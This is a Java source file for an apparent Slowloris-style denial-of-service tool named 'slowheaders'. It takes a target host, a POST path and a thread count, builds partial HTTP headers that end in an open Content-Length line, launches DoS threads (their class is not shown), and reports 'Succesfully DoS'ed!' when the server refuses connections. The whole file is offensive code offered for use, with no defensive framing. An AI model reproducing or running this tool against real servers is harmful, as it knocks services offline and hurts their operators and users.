package com.moofMonkey;

import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;

/**
 * @author moofMonkey
 */
public class Main {
	static String host, file, ip;
	static int port;
	public static String[] headers;


	/**
	 * Main method of the program
	 * @param args - arguments
	 */
	public static void main(String[] args) throws Throwable {
		try {
			host = args[0];
			file = "/" + args[1];
			try {
				String[] sp = host.split("[:]");
				host = sp[0];
				port = Integer.valueOf(host);
			} catch(Throwable t) {
				port = 80;
			}
			
			headers = 
				new String[]
					{
						"POST " + file + " HTTP/1.1",
						"Host: " + host,
						"Connection: Keep-Alive",
						"Accept: */*; q=0.01",
						"Origin: http://" + host,
						"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) "
							+ "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
						"DNT: 1",
						"Accept-Encoding: gzip, deflate",
						"Accept-Language: en-US",
						"Content-Length: "
					};
			
			for(int i = Integer.valueOf(args[2]); i > 0 ; i--)
				new DoS().start();
		} catch(Throwable t) {
			System.out.println("Invalid arguments.");
			System.out.println("Usage: java -jar slowheaders.jar <host> <filewithpost> <threads>");
		}
	}
	
	/**
	 * Generates new socket for DoS
	 */
	public static Socket newSocket() {
		try {
			if(ip == null)
				ip = InetAddress.getByName(host).getHostAddress();
			return new Socket(ip, port);
		} catch(ConnectException ce) {
			System.out.println("Succesfully DoS\'ed!");
		} catch(SocketException t) {
			System.out.println("DoS temporitary failed. Try restart.");
			System.exit(-1);
		} catch(Throwable t) {
			t.printStackTrace();
			System.exit(-1);
		}
		
		return null;
	}
}
